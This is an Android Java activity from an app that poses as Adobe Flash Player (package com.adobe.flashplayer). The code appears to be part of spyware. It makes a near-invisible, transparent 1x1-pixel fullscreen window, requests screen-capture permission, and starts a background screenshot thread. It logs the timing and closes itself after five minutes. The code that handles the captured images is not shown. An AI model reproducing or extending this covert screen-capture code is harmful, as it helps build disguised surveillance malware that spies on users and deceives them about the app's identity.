package com.adobe.flashplayer.data;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import android.media.projection.MediaProjectionManager;
import com.adobe.flashplayer.R;
import com.adobe.flashplayer.MyLog;

import java.lang.ref.WeakReference;


@SuppressLint("NewApi") public class ScreenShotActivity extends Activity{

    private final String TAG = "[ljg]ScreenShotActivity ";
    private static final int REQUEST_MEDIA_PROJECTION = 0x12345678;
    private static long scrnstarttime;

    WeakReference <Activity> mActivity;

    protected void onActivityResult(int requestCode, int resultCode, Intent intent) {

        super.onActivityResult(requestCode, resultCode, intent);

        if (requestCode == REQUEST_MEDIA_PROJECTION) {

            finish();

            if (resultCode == Activity.RESULT_OK && intent != null) {

                new Thread(new ScreenShot(ScreenShotActivity.this,intent)).start();

                long scrnendtime = System.currentTimeMillis();
                long scrnusetime = scrnendtime - ScreenShotActivity.scrnstarttime;
                MyLog.writeLogFile(TAG+" cost milliseconds:" + String.valueOf(scrnusetime) + "\r\n");
            }
            else{
                MyLog.writeLogFile(TAG+" result code is:" + resultCode + "\r\n");
                Log.e(TAG,"result code is:" + resultCode);
            }
        }

        Log.e(TAG, "onActivityResult complete");
    }



    @Override
    public void onCreate(Bundle savedInstanceState){

        super.onCreate(savedInstanceState);

        scrnstarttime = System.currentTimeMillis();

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);

        getWindow().setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
        getWindow().setDimAmount(0f);
        setContentView(R.layout.activity_screensnapshot);

		Window window = getWindow();
		window.setGravity(Gravity.LEFT | Gravity.TOP);
		WindowManager.LayoutParams params  = window.getAttributes();
		params.x = 0;
		params.y = 0;
		params.height = 1;
		params.width = 1;
		window.setAttributes(params);

        MediaProjectionManager mediamgr = (MediaProjectionManager)getSystemService(  Context.MEDIA_PROJECTION_SERVICE);

        Intent intent = mediamgr.createScreenCaptureIntent();

        startActivityForResult(intent,REQUEST_MEDIA_PROJECTION);

        this.mActivity = new WeakReference<Activity>(ScreenShotActivity.this);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Thread.sleep(300000);

                    mActivity.get().finish();

                    return;
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        Log.e(TAG,"onCreate");
        return;
    }



    @Override
    protected void onDestroy() {
        super.onDestroy();
        Log.e(TAG,"onDestroy");
    }

}
